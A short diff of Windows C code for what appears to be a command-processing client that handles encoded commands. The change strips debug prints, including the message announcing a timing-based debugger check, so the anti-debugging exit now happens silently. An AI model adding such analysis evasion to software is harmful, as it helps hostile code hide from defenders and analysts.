@@ -38,10 +38,8 @@ RET_CODE processCommands(CLIENT_HANDLER* client) {
         QueryPerformanceCounter(&end);
         LONG elapsedTime = ((end.QuadPart - start.QuadPart) / freq.QuadPart) - slp;
 
-        if (elapsedTime > 2.5) {   // if it longer than 2.5 seconds then exit
-            printf("Debugger detected by performance!\n");
-            return R_DETECT;
-        }
+        // if it longer than 2.5 seconds then exit
+        if (elapsedTime > 2.5) { return R_DETECT; }
 
         // if shutdown, or the commands were incorrectly encoded then exit!
         if (ret == R_DO_SHUTDOWN)   { return R_DO_SHUTDOWN; }
@@ -95,9 +93,7 @@ static RET_CODE executeCommand(char* cmdStr, unsigned char key, int* slp) {
  * @param n number of milliseconds to sleep for
  */
 static void doSleep(int n) {
-    printf("Sleeping for %dms\n", n);
     Sleep(n);
-    printf("Sleep finsished!\n");
 }
 
 /**
